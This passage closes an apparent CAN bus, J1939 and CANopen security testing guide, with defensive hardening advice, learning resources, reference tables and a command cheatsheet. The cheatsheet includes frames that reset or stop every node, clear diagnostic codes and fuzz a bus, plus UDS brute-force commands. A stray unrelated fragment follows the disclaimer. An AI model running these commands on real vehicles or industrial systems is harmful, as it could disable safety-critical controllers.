[What an attacker can achieve — safety, availability, integrity, confidentiality]

### Root Cause
[Why the vulnerability exists — design flaw, implementation bug, missing feature]

### Recommendation
[Specific, actionable remediation guidance with priority and estimated effort]

### References
- SAE J1939-81 §X.X (Address Claiming)
- CAN Security Alliance White Paper
- CVE-XXXX-XXXXX (if applicable)
```

### 20.3 Deliverables Checklist

- [ ] Executive Summary (non-technical, business risk language)
- [ ] Technical Findings Report (all findings with reproduction steps)
- [ ] Raw traffic logs (candump.log files, compressed)
- [ ] Decoded traffic analysis (Wireshark pcap with annotations)
- [ ] Node map / architecture diagram
- [ ] PGN/COB-ID inventory discovered
- [ ] Fuzzing crash evidence (if any)
- [ ] Remediation roadmap with prioritization

---

## 21. Defensive Measures & Mitigations

### 21.1 Protocol-Level Defenses

#### Message Authentication Code (MAC)
**J1939-76** and emerging standards add MAC to CAN messages:
- AUTOSAR SecOC (Secure Onboard Communication) module
- MAC appended to data payload (typically 4-byte truncated MAC)
- Requires pre-shared keys between communicating nodes
- Adds latency — must be considered for real-time safety functions

#### CAN Identifier Whitelisting (Intrusion Detection)
```
Firewall ECU monitors all frames:
- Accept list: Known valid (ID, SA, PGN) triplets
- Reject: Any frame not on the accept list
- Alert: Log and notify when anomalous frames detected
```

Tools: **Argus** (commercial), **CANShield**, **AUTOSAR IdsM** module

#### Rate Limiting
- Each ECU enforces maximum transmission rate per ID
- Prevents flooding attacks
- Must be implemented in all nodes for effectiveness

### 21.2 Architecture-Level Defenses

| Defense | Description | Addresses |
|---|---|---|
| **CAN bus segmentation** | Separate safety-critical buses; use authenticated gateways | Lateral movement |
| **Physical access restriction** | Lock OBD port; require authentication for J1939 connector | Physical access attacks |
| **Secure boot** | ECU firmware verified via digital signature before execution | Firmware tampering |
| **OTA update authentication** | PKI-based firmware update with rollback protection | Update-based attacks |
| **HSM (Hardware Security Module)** | Dedicated crypto co-processor on ECU for key storage/MAC | Key compromise |
| **Intrusion Detection System (IDS)** | Monitor CAN traffic for anomalies at gateway | Injection detection |
| **Diagnostic authentication** | Require password/certificate for UDS extended sessions | Diagnostic abuse |

### 21.3 CANopen-Specific Hardening

```
1. Implement CANopen Security (CiA 308, CiA 303-3)
2. Restrict NMT master — only one designated NMT master
3. Guard SDO access via application-level authentication
4. Use CAN FD + message authentication for new designs
5. Disable unused SDO indices / set write protection
6. Monitor heartbeat consumers and alert on unexpected resets
```

### 21.4 J1939-Specific Hardening

```
1. Implement J1939-76 (Network Security) in new designs
2. Deploy AUTOSAR SecOC for PDU authentication
3. Restrict diagnostic access via J1939-73 security levels
4. Physically secure J1939 connector (lock covers, tamper detection)
5. Deploy gateway with deep packet inspection between CAN segments
6. Log all address claims and alert on unexpected address changes
```

---

## 22. CTF/Learning Resources & References

### 22.1 Free Learning Environments

| Resource | Link | Description |
|---|---|---|
| **ICSim** | https://github.com/zombieCraig/ICSim | Virtual instrument cluster simulator |
| **OpenGarages Car Hacking Village** | https://github.com/OpenGarages | CTF materials and tutorials |
| **Automotive CTF challenges** | CTFtime.org | Search "automotive" or "canbus" |
| **Car Hacker's Handbook** | Free online: opengarages.org | Comprehensive free textbook |

### 22.2 Essential GitHub Repositories

| Repository | Purpose |
|---|---|
| https://github.com/CaringCaribou/caringcaribou | Primary automotive security tool |
| https://github.com/Cr0wTom/caringcaribounext | Updated fork |
| https://github.com/collin80/SavvyCAN | GUI CAN analysis |
| https://github.com/linux-can/can-utils | SocketCAN utilities |
| https://github.com/cantools/cantools | Python DBC decode |
| https://github.com/hardbyte/python-can | Python CAN library |
| https://github.com/iDoka/awesome-canbus | Curated tools list |
| https://github.com/jaredthecoder/awesome-vehicle-security | Curated security resources |
| https://github.com/CANopenTerm/CANopenTerm | CANopen testing |
| https://github.com/christiansandberg/canopen | Python CANopen |
| https://github.com/CANopenNode/CANopenNode | Open source CANopen stack |
| https://github.com/zombieCraig/ICSim | CAN simulator |
| https://github.com/kentindell/canhack | Low-level CAN hacking |
| https://github.com/CANToolz/CANToolz | Black-box framework |
| https://github.com/TOSUN-Shanghai/TSMaster | Multi-protocol tool |
| https://github.com/secdev/scapy | Packet manipulation with CAN/UDS |
| https://github.com/rbei-etas/busmaster | Open source bus master |

### 22.3 Standards & Specifications

| Standard | Body | Access |
|---|---|---|
| ISO 11898-1:2015 (CAN FD) | ISO | Purchase at iso.org |
| SAE J1939 series | SAE International | Purchase at sae.org |
| CiA 301 (CANopen Application Layer) | CAN in Automation | Free at can-cia.org |
| CiA 401 (CANopen I/O profile) | CAN in Automation | Free at can-cia.org |
| CiA 402 (CANopen Drive profile) | CAN in Automation | Free at can-cia.org |
| ISO 14229 (UDS) | ISO | Purchase at iso.org |
| AUTOSAR SecOC | AUTOSAR | Free at autosar.org |

### 22.4 Academic & Research References

- **Miller, C. & Valasek, C.** (2015). "Remote Exploitation of an Unaltered Passenger Vehicle." DEF CON 23. https://illmatics.com/Remote%20Car%20Hacking.pdf
- **Koscher, K. et al.** (2010). "Experimental Security Analysis of a Modern Automobile." IEEE S&P 2010.
- **Mukherjee, S. et al.** (2016). "Practical DoS Attacks on Embedded Networks in Commercial Vehicles." ESCAR 2016.
- **Bozdal, M. et al.** (2020). "Evaluation of CAN Bus Security Challenges." Sensors MDPI.
- **JCOM1939 Security Article**: https://jcom1939.com/security-concerns-in-can-canopen-and-j1939-networks/

### 22.5 Online Learning Paths

```
Beginner Path:
1. CSS Electronics CAN Bus Intro — csselectronics.com/pages/can-bus-simple-intro-tutorial
2. CSS Electronics J1939 Intro — csselectronics.com/pages/j1939-explained-simple-intro-tutorial  
3. CSS Electronics CANopen Intro — csselectronics.com/pages/canopen-tutorial-simple-intro
4. Install SocketCAN, run candump on vcan0
5. Set up ICSim, practice with caringcaribou

Intermediate Path:
1. Car Hacker's Handbook (opengarages.org) — read completely
2. Build a Raspberry Pi + MCP2515 lab bench
3. Work through all caringcaribou modules
4. SavvyCAN with real DBC files
5. Write custom python-can scripts for PGN analysis

Advanced Path:
1. Read AUTOSAR SecOC specification
2. Study SAE J1939-76 security
3. Implement CANToolz custom module for target protocol
4. ChipWhisperer power analysis on CAN ECU
5. Contribute to CaringCaribou or cantools open source projects
```

---

## Appendix A: Quick Reference Command Cheatsheet

```bash
# === INTERFACE SETUP ===
sudo modprobe vcan                                    # load virtual CAN module
sudo ip link add dev vcan0 type vcan                  # create virtual interface
sudo ip link set up vcan0                             # bring up virtual interface
sudo ip link set can0 up type can bitrate 250000      # real hardware 250Kbps
sudo ip link set can0 up type can bitrate 500000 dbitrate 2000000 fd on  # CAN FD
sudo ip link set can0 down                            # bring down interface

# === CAPTURE ===
candump can0                                          # live dump to terminal
candump -l can0                                       # dump to timestamped file
candump -t a can0                                     # with absolute timestamps
candump can0 18FEF004:1FFFFFFF                        # filter specific J1939 PGN
candump can0 180:7F0                                  # CANopen TPDO1 range

# === SEND ===
cansend can0 123#DEADBEEF                             # 11-bit ID, 4 bytes
cansend can0 18FEF004#0102030405060708                # 29-bit J1939
cansend can0 000#8100                                 # CANopen NMT Reset All
cangen can0 -I r -L r -D r -g 1 -n 1000              # fuzz 1000 random frames
canplayer -I logfile.log can0                         # replay log

# === CARING CARIBOU ===
caringcaribou dump                                    # passive sniff
caringcaribou uds discovery                           # find UDS ECUs
caringcaribou uds services 0x7E0 0x7E8               # service scan
caringcaribou uds subservices 0x7E0 0x7E8 0x10       # subservice brute force
caringcaribou uds security_seed 0x7E0 0x7E8 0x01     # collect seeds
caringcaribou uds dump_dids 0x7E0 0x7E8              # dump all DIDs
caringcaribou fuzzer seed_randomness_fuzzer 0x7E0 0x7E8 0x01  # fuzz PRNG

# === DIAGNOSTICS ===
# Request J1939 DM1 (Active DTCs) — normally broadcast, just listen:
candump can0 | grep -i "FECA"
# Clear J1939 DTCs (DM11 - Diagnostic Data Clear):
cansend can0 18EAFFF9#ECFE00FFFFFFFF

# === CANOPEN ===
# NMT: Reset all nodes
cansend can0 000#8100
# NMT: Stop specific node (Node 5)
cansend can0 000#0205
# NMT: Start specific node
cansend can0 000#0105
```

---

## Appendix B: J1939 Common PGN Quick Reference

| PGN (hex) | Decimal | Name | Notes |
|---|---|---|---|
| 0xF004 | 61444 | EEC1 | Engine speed, torque |
| 0xFEF1 | 65265 | CCVS | Vehicle speed |
| 0xFEF0 | 65264 | EBC1 | Brake controller |
| 0xFEF5 | 65269 | AMB | Ambient conditions |
| 0xFECA | 65226 | DM1 | Active DTCs |
| 0xFECB | 65227 | DM2 | Previously active DTCs |
| 0xFEEC | 65260 | DM11 | Clear DTCs |
| 0xEA00 | 59904 | Request | Request any PGN |
| 0xEE00 | 60928 | AddressClaimed | Address management |
| 0xEC00 | 60416 | TP.CM | Transport Protocol CM |
| 0xEB00 | 60160 | TP.DT | Transport Protocol Data |
| 0xFED8 | 65240 | CA | Commanded Address |

---

## Appendix C: CANopen Function Codes Reference

| Function | Code | COB-ID Base | Notes |
|---|---|---|---|
| NMT | 0x0 | 0x000 | Network management |
| SYNC | 0x1 | 0x080 | Synchronization |
| TIME | 0x2 | 0x100 | Time stamp |
| TPDO1 | 0x3 | 0x180 | Process data TX |
| RPDO1 | 0x4 | 0x200 | Process data RX |
| SDO (Tx) | 0xB | 0x580 | Service data, server→client |
| SDO (Rx) | 0xC | 0x600 | Service data, client→server |
| Heartbeat | 0xE | 0x700 | Node monitoring |

---

*Document Version: 1.0 — March 2026*  
*Maintained by the security research community*  
*Always test only on systems you own or have explicit written permission to test.*

---

> **Legal Reminder**: This guide is for authorized security research, penetration testing, and academic study only. Unauthorized access to vehicle networks or industrial control systems is a criminal offense. Ensure you have written authorization before conducting any tests described in this document. The techniques described here, when used responsibly, help improve the security of CAN-based systems that people depend on for safety every day.

- **1000**: This value (1000 in this case) specifies the length of the transmit queue. Adjusting this parameter can affect how the CAN interface manages the transmission of messages, potentially addressing issues related to buffer space availability (`No buffer space available` errors).


 
